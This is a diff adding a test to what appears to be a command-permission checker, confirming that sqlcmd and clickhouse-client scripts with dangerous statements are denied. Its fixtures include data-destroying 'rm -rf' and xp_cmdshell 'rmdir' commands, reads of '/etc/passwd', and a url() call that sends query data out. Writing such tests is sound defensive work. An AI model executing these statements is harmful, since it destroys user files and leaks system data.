@@ -4301,6 +4301,29 @@ describe("SQL files and scripts in other languages a command runs (commands-remo
     }
   });
 
+  it("judges sqlcmd's and clickhouse-client's files in their own dialect: `!!`, `:r`, xp_cmdshell and url() ask (r10-commands-x10-2)", async () => {
+    for (const [text, run] of [
+      ["!! rm -rf /home/ana/Documents\n", "sqlcmd -i a.sql"], [":!! rm -rf /home/ana/Documents\n", "sqlcmd -S db -i a.sql"],
+      ["EXEC xp_cmdshell 'rmdir /s /q C:\\Users\\ana';\n", "sqlcmd -i a.sql"], [":r other.sql\nGO\n", "sqlcmd -i a.sql"],
+      ["SELECT * FROM OPENROWSET(BULK 'C:\\x', SINGLE_CLOB) AS t;\n", "sqlcmd -i a.sql"], ["EXEC('SEL' + 'ECT 1');\n", "sqlcmd -i a.sql"],
+      ["SELECT * FROM url('https://x.example/?d=' || (SELECT 1), CSV);\n", "clickhouse-client --queries-file a.sql"],
+      ["SELECT * FROM executable('x.sh', TSV, 'a String');\n", "clickhouse-client --queries-file=a.sql"],
+      ["SELECT * FROM file('/etc/passwd', LineAsString);\n", "clickhouse-client < a.sql"],
+    ] as const) {
+      const h = flow({ "/home/ana/proj/a.sql": text });
+      expect((await local(h, "echo x > a.sql")).resultType, text).toBe("success");
+      h.existing.add("/home/ana/proj/a.sql");
+      expect((await local(h, run)).resultType, `${run}: ${text}`).toBe("denied");
+      expect(h0rules(h), text).toContain("unclear.sql");
+    }
+    // The same files that only read still run.
+    for (const run of ["sqlcmd -i a.sql", "clickhouse-client --queries-file a.sql", "clickhouse-client < a.sql"]) {
+      const ok = flow({ "/home/ana/proj/a.sql": "SELECT name FROM users WHERE id = 'it''s';\n" });
+      expect((await local(ok, run)).resultType, run).toBe("success");
+      expect(ok.asked, run).toEqual([]);
+    }
+  });
+
   it("asks when a SQL file the task wrote can't be read, and runs one that only reads (commands-remote-r10-4)", async () => {
     const h = flow();
     await local(h, "echo 'DROP TABLE users;' > a.sql");
